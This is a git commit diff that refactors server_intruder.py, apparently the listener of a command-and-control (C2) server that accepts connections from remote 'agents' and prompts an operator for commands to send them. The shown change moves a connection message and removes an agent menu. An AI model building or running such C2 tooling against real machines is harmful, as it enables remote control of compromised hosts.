194d9477686e387fb53990707109de7c7db52694
daemoncibsec <daemoncibsec@gmail.com>
2025-10-05 01:05:37 +0200

    Eliminate part of the code for testing purposes

--- server_intruder.py
+++ server_intruder.py
@@ -9,11 +9,10 @@ def start_server(host='', port=6789):
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         server_socket.bind((host, port))
-        server_socket.listen(5)
+        server_socket.listen()
         print(f"Listening at {host}:{port}\nWaiting for incoming connections.")
         while True:
             client_socket, addr = server_socket.accept()
-            print(f"Accepted connection from {addr}\nUse '!close' to close the connection\nUse '!exit' to terminate the C2 server\n")
             handle_client(client_socket, addr)
     except KeyboardInterrupt:
         print("\n\nServer shutting down...")
@@ -22,16 +21,9 @@ def start_server(host='', port=6789):
         print("Server terminated.\n")
         sys.exit(0)
 
-def menu():
-    print("""--- Agents connected ---""")
-    for entry in thread_index:
-        if len(thread_index) > 0:
-            print(entry)
-        else:
-            print("No connections received.")
-
 def handle_client(client_socket, addr):
     try:
+        print(f"Accepted connection from {addr}\nUse '!close' to close the connection\nUse '!exit' to terminate the C2 server\n")
         while True:
             prompt = input('>>> ')
             if prompt == '!exit':
